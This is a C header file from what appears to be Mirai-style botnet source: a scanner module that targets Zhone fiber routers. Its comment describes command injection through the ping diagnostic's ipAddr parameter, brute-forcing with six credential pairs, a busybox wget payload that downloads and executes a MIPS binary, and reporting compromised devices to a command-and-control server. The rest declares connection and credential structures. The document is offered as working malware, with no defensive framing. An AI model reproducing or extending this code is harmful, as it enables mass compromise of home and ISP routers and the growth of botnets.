#ifndef _ZHONE_H
#define _ZHONE_H

#include "includes.h"

/* ============================================================================
 * ZHONE SCANNER MODULE - FTTH/ONT Router Exploitation (Improved)
 * ============================================================================
 * Exploits Zhone ONT/OLT fiber routers via ping diagnostic command injection
 * Targets: Zhone equipment with session key authentication
 * Method: GET /zhnping.cmd with session key + command injection in ipAddr parameter
 * Credentials: 6 username/password combinations
 * Payload: /bin/busybox wget http://<server>/bins/axis.mips -O /var/g; execute
 * Reports successful compromises to C&C via SCAN_CB_PORT
 * ============================================================================ */

#define ZHONE_MAX_CONNS 64
#define ZHONE_CONNECTION_TIMEOUT 30
#define ZHONE_READ_TIMEOUT 20

struct zhone_credential {
    char *username;
    char *password;
};

struct zhone_connection {
    int fd;
    uint8_t state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    time_t last_recv;
    time_t connect_time;
    int cred_index;
    BOOL logged_in;
    char username[32];
    char password[32];
    char session_key[64];
    char rdbuf[4096];
    int rdbuf_pos;
};

void zhone_scanner_init(void);

#endif
